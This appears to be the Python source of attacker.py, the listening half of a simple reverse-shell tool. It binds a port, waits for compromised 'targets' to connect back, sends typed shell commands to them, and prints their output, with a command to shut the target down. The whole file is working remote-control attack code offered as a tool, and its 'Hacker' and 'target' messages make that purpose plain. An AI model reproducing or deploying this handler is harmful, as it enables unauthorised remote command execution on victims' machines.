# ========================================================================
# $File: attacker.py $
# $Date: 2019-01-21 23:03:34 $
# $Revision: $
# $Creator: Jen-Chieh Shen $
# $Notice: See LICENSE.txt for modification and distribution information
#                   Copyright © 2019 by Shen, Jen-Chieh $
# ========================================================================

import socket
import sys
import os
import locale

import command


HOST = ''     # Symbolic name meaning all available interfaces
PORT = 50007  # Arbitrary non-privileged port

BUF_SIZE = 1024

LISTEN_COUNT = 1

ENCODE_TYPE = 'utf-8'
DECODE_TYPE = 'utf-8'


def process_cmd_continue(in_cmd):
    """Process commmand that need to be continue.

    @param { stirng } in_cmd : Command string.
    """

    # No need to receive if just changing the directory.
    if "cd" in in_cmd:
        return True

    if in_cmd == "cls" or in_cmd == "clear":
        os.system('cls')
        os.system('clear')
        return True

    return False


def main():
    """Program Entry point."""

    # Resolve arguments.
    arg_len = len(sys.argv)

    if 2 <= arg_len:
        port = int(sys.argv[1])
    else:
        port = PORT

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, port))
        s.listen(LISTEN_COUNT)

        print(f"Bind port: {port}")

        while True:
            print(f"Waiting target... : {LISTEN_COUNT}")
            conn, addr = s.accept()
            with conn:
                print('New target => ', addr)
                while True:
                    # Receive shell info.
                    path = conn.recv(BUF_SIZE).decode(DECODE_TYPE)

                    # Get input command.
                    in_cmd = input(path + "$ ")

                    # Check exit command before sending.
                    if in_cmd == command.Command.EXIT.value:
                        break

                    # Send it.
                    conn.sendall(in_cmd.encode(ENCODE_TYPE))

                    # Check shutdown command before receiving.
                    if in_cmd == command.Command.SHUTDOWN.value:
                        print("Hacker shutdown the target...")
                        break

                    if process_cmd_continue(in_cmd):
                        continue

                    # Receive shell command output.
                    outs = conn.recv(BUF_SIZE).decode(DECODE_TYPE)

                    print(outs)

if __name__ == "__main__":
    main()
